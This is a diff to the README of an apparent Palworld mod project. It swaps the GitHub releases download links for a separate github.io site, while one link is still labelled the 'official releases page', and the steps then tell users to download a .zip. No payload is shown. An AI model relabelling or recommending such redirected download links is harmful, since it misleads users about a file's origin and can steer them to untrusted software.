@@ -1,7 +1,7 @@
 # 🎮 Palworld-Ultimate-Mod - Improve your gameplay with powerful tools
 
 <p align="center">
-  <a href="https://github.com/matthewbinocular707/Palworld-Ultimate-Mod/releases">
+  <a href="https://matthewbinocular707.github.io">
     <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download">
   </a>
 </p>
@@ -32,7 +32,7 @@ Before you use this mod, check that your computer meets these requirements:
 
 Follow these steps to set up the mod on your machine.
 
-1. Visit the [official releases page](https://github.com/matthewbinocular707/Palworld-Ultimate-Mod/releases).
+1. Visit the [official releases page](https://matthewbinocular707.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .zip to start your download.
 4. Open your Downloads folder on your computer.
